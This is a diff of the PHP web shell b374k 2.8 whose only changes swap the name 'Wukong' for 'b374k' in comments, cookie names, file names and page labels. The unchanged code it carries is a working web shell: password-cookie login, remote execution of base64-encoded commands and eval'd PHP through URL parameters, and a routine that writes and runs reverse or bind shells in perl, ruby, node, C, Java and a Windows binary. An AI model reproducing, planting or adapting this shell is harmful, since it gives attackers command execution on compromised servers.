@@ -1,15 +1,15 @@
 <?php
 /*
-	Wukong 2.8
+	b374k 2.8
 	Jayalah Indonesiaku
 	(c)2013
-	http://code.google.com/p/Wukong-shell
+	http://code.google.com/p/b374k-shell
 
 */
-$s_pass = "4be1ab19f35868b70e5e2cbcffb81631f2ab79c6"; // default password : Wukong (login and change to new password)
+$s_pass = "4be1ab19f35868b70e5e2cbcffb81631f2ab79c6"; // default password : b374k (login and change to new password)
 
 $s_ver = "2.8"; // shell ver
-$s_title = "Wukong ".$s_ver; // shell title
+$s_title = "b374k ".$s_ver; // shell title
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
 $s_debug = false; // debugging mode
 
@@ -44,19 +44,19 @@ else{
 
 $s_auth = false; // login status
 if(strlen(trim($s_pass))>0){
-	if(isset($_COOKIE['Wukong'])){
-		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['Wukong']))) $s_auth = true;
+	if(isset($_COOKIE['b374k'])){
+		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
 	}
 	if(isset($_GP['login'])){
 		$s_login = kript($_GP['login']);
 		if(strtolower(trim($s_pass)) == $s_login){
-			setcookie("Wukong",$s_login,time() + $s_login_time);
+			setcookie("b374k",$s_login,time() + $s_login_time);
 			$s_auth = true;
 		}
 	}
 	if(isset($_GP['x']) && ($_GP['x']=='logout')){
 		$persist = array("theme", "cwd");
-		$s_reload = (isset($_COOKIE['Wukong_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
+		$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
 		foreach($_COOKIE as $s_k=>$s_v){
 			if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,"",time() - $s_login_time);
 		}
@@ -68,13 +68,13 @@ else $s_auth = true;
 
 // This is a feature where you can control this script from another apps/scripts
 // you need to supply password (in sha1(md5()) format) to access this
-// this example using password 'Wukong' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
+// this example using password 'b374k' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
 // give the code/command you want to execute in base64 format
 // this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
 // example:
-//		http://www.myserver.com/Wukong.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
+//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
 // next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
-//		http://www.myserver.com/Wukong.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
+//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
 // recommended ways is using POST DATA
 // note that it will not works if shell password is empty ($s_pass);
 // better see code below
@@ -253,7 +253,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 		elseif($s_lang=="pl") $s_runlang = "perl";
 		elseif($s_lang=="rb") $s_runlang = "ruby";
 		elseif($s_lang=="js") $s_runlang = "node";
-		$s_fpath = "Wukong_rs.".$s_lang;
+		$s_fpath = "b374k_rs.".$s_lang;
 		if(@is_file($s_fpath)) unlink($s_fpath);
 		if($s_file = fopen($s_fpath, "w")){
 			fwrite($s_file, $s_fc);
@@ -272,7 +272,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 		else $s_result = $s_errperm;
 	}
 	elseif($s_lang=="c"){
-		$s_fpath = "Wukong_rs";
+		$s_fpath = "b374k_rs";
 		if(@is_file($s_fpath)) unlink($s_fpath);
 		if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
 		if($s_file = fopen($s_fpath.".c", "w")){
@@ -291,7 +291,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 		else $s_result = $s_errperm;
 	}
 	elseif($s_lang=="win"){
-		$s_fpath = "Wukong_rs.exe";
+		$s_fpath = "b374k_rs.exe";
 		if(@is_file($s_fpath)) unlink($s_fpath);
 		if($s_file = fopen($s_fpath,"w")){
 			fwrite($s_file,$s_fc);
@@ -304,7 +304,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 		else $s_result = $s_errperm;
 	}
 	elseif($s_lang=="java"){
-		$s_fpath = "Wukong_rs";
+		$s_fpath = "b374k_rs";
 		if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
 		if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
 		if($s_file = fopen($s_fpath.".java", "w")){
@@ -913,11 +913,11 @@ $s_self = "?";
 $s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
 $s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));
 
-if(isset($_COOKIE['Wukong_included'])){
+if(isset($_COOKIE['b374k_included'])){
 	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
 	else{
 		$s_self = "?";
-		setcookie("Wukong_included", "0" ,time() - $s_login_time);
+		setcookie("b374k_included", "0" ,time() - $s_login_time);
 		setcookie("s_self", $s_self ,time() + $s_login_time);
 	}
 }
@@ -929,12 +929,12 @@ else{
 		}
 		if(isset($s_home)) $s_self = $s_home;
 		elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
-		setcookie("Wukong_included", "1" ,time() + $s_login_time);
+		setcookie("b374k_included", "1" ,time() + $s_login_time);
 		setcookie("s_self", $s_self ,time() + $s_login_time);
 	}
 	else{
 		$s_self = "?";
-		setcookie("Wukong_included", "0" ,time() - $s_login_time);
+		setcookie("b374k_included", "0" ,time() - $s_login_time);
 		setcookie("s_self", $s_self ,time() + $s_login_time);
 	}
 }
@@ -996,7 +996,7 @@ if($s_auth){
 	foreach($s_access as $s){
 		if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
 		else{
-			if(!isset($_COOKIE['Wukong'])){
+			if(!isset($_COOKIE['b374k'])){
 				$t = explode("_", $s);
 				$t = check_access($t[1]);
 				if($t!==false){
@@ -1298,7 +1298,7 @@ if($s_auth){
 					$s_script = $s_classname;
 				}
 				else{
-					$s_rand = "Wukong_".substr(md5(time().rand(0,100)),0,8);
+					$s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
 					$s_script = $s_rand;
 					$s_code = "class ".$s_rand." { ".$s_code . " } ";
 				}
@@ -2363,10 +2363,10 @@ if(!empty($s_error)) $s_result = notif($s_error).$s_result;
 <table id='main'><tr><td>
 <?php if($s_auth){?>
 	<div><span style='float:right;'><?php
-	if(!isset($_COOKIE['Wukong_included'])){
+	if(!isset($_COOKIE['b374k_included'])){
 	?><a href='?x=pass'>password</a> | 
 	<?php }
-	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>Wukong</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
+	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>b374k</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
 	<div style='clear:both;'></div>
 	<form method='post' name='g'></form>
 	<div id='menu'>
@@ -2399,12 +2399,12 @@ else echo "- shell command -";
 	<div style='width:100%;text-align:center;'>
 	<form action='<?php echo $s_self; ?>' method='post'>
 	<img src='<?php echo $s_favicon; ?>' style='margin:2px;vertical-align:middle;' />
-	Wukong&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
+	b374k&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
 	<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
 	</form>
 	</div>
 <?php }?>	</td></tr></table>
-<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y",time())." "; ?>Wukong</p>
+<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y",time())." "; ?>b374k</p>
 <script type='text/javascript'>
 var d = document;
 var scroll = false;
